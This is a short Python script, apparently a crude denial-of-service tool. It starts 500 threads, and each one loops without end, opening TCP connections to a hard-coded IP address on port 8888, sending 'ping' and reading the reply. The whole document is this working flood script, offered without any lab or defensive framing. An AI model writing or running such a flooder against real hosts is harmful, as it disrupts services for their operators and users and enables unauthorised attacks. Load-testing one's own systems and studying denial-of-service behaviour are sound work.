import socket
import threading

TARGET_IP = '192.161.1.2'
TARGET_PORT = 8888

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendall(b"ping\n")
            s.recv(1024)  # receive 'pong'
        except Exception as e:
            print(f"[!] Error: {e}")

# Launch 500 threads
for _ in range(500):
    threading.Thread(target=attack).start()
